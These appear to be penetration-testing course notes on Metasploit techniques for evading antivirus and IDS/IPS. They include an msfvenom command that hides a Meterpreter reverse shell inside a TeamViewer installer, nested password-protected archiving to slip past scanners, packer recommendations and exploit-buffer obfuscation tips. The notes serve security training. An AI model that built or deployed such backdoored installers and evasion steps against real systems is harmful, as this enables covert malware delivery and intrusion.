### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Firewall, IDS, IPS Evasion <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Firewall and IDS/IPS Evasion



Two defense categories:

| Layer | Where | Examples |
|---|---|---|
| Endpoint Protection | On individual hosts | Avast, NOD32, Malwarebytes, BitDefender, EDR agents |
| Perimeter Protection | Network edge / DMZ | Firewalls, IPS/IDS, WAF, NAC |

Detection methods used by these defenses:

| Method | How it triggers |
|---|---|
| Signature-based | 100% match against known attack pattern DB |
| Heuristic / Anomaly | Behavioral deviation from baseline |
| Stateful Protocol Analysis | Protocol activity outside accepted norms |
| SOC Live Monitoring | Human + automated alerting on traffic flow |

Most host AV is signature-based + scans on storage / running processes. Encoders alone don't beat it. MSF6 ships AES-encrypted Meterpreter comms which handles most network IDS/IPS — the remaining problem is the file landing on disk before it executes in memory.

#### Backdoored Executables (msfvenom -x)

Embed a payload into a legitimate installer and run both threads:

```diff
+ $ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

Key flags:

| Flag | Purpose |
|---|---|
| `-x` | Template executable to inject into |
| `-k` | Keep template behavior (runs original program + payload thread) |
| `-e` | Encoder |
| `-i` | Iterations |

#### Archives

Password-protected archives bypass most signature-based scanners (encrypted contents can't be inspected) but trigger admin "couldn't scan" alerts. Double-archiving with extension stripping further obscures.

```diff
+ $ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+ $ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+ $ rar a ~/test.rar -p ~/test.js
+ $ mv test.rar test
+ $ rar a test2.rar -p test
+ $ mv test2.rar test2
```

#### Packers

Compress payload + decompression stub into a single binary. Original functionality preserved at runtime, signature destroyed at rest.

| Packer | Note |
|---|---|
| [UPX](https://upx.github.io) | Open-source, ubiquitous |
| [Enigma Protector](https://enigmaprotector.com) | Commercial |
| [MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm) | Lightweight |
| Themida / Morphine / MEW / ExeStealth / Alternate EXE Packer | Various |

#### Exploit Coding for Evasion

- Buffer-overflow exploit buffers have recognizable hex patterns — IPS DB-matched
- Randomize with `Offset` switches in module Targets:

	'Targets' =>
	[
	  ['Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 }],
	]

- Avoid obvious NOP sleds in shellcode landing zones
- Test in a sandbox before client deployment — you typically only get one shot

#### Quick Recap

- AV/IPS = signatures + behavior baselines + protocol norms
- Effective evasion = encrypted tunnels + obfuscation + template injection + multi-layer archives + packers + exploit code randomization
- Continuous adaptation required — defenders update signatures fast
